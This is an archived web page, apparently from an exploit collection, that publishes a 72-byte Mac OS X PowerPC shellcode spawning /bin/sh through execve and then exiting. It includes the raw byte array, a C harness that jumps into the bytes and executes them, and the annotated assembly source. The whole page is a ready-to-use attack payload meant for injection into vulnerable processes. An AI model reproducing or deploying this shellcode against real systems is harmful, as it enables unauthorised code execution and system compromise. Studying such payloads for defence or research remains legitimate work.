<html><head><title>Osx/ppc - execve(\\\&quot;/bin/sh\\\&quot;,[\\\&quot;/bin/sh\\\&quot;],NULL)&amp; exit() - 72 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * [MacOSX/PowerPC]
 * Shellcode for: execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL), exit()
 * 72 bytes
 * hophet [at] gmail.com
 * http://www.nlabs.com.br/~hophet/
 *
 */

#include &quot;stdio.h&quot;
#include &quot;string.h&quot;

char shellcode[] = 

&quot;\x7c\xa5\x2a\x79&quot;
&quot;\x40\x82\xff\xfd&quot;
&quot;\x7d\x68\x02\xa6&quot;
&quot;\x3b\xeb\x01\x71&quot;
&quot;\x39\x40\x01\x71&quot;
&quot;\x39\x1f\xfe\xce&quot;
&quot;\x7c\xa8\x29\xae&quot;
&quot;\x38\x7f\xfe\xc7&quot;
&quot;\x90\x61\xff\xf8&quot;
&quot;\x90\xa1\xff\xfc&quot;
&quot;\x38\x81\xff\xf8&quot;
&quot;\x38\x0a\xfe\xca&quot;
&quot;\x44\xff\xff\x02&quot;
&quot;\x60\x60\x60\x60&quot;
&quot;\x38\x0a\xfe\x90&quot;
&quot;\x44\xff\xff\x02&quot;
&quot;\x2f\x62\x69\x6e&quot;
&quot;\x2f\x73\x68\x54&quot;;

int main() {

	void (*p)();
	p = (void *)&amp;shellcode;
	printf(&quot;Lenght: %d\n&quot;, strlen(shellcode));
	p();
}
/*
.globl _main
.text
_main:
        xor.    r5, r5, r5	// r5 = NULL
        bnel    _main
        mflr    r11
        addi    r31, r11, 369
        li      r10, 369
        addi    r8, r31, -306
        stbx    r5, r8, r5
        addi    r3, r31, -313
        stw     r3, -8(r1)	// [/bin/sh]
        stw     r5, -4(r1)
        subi    r4, r1, 8	// [/bin/sh]
        addi    r0, r10, -310	// r0 = 59
        .long   0x44ffff02	// sc opcode
        .long	0x60606060	// NOP
        addi    r0, r10, -368	// r0 = 1
        .long   0x44ffff02	// sc opcode
string:	.asciz	&quot;/bin/shT&quot;
*/


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
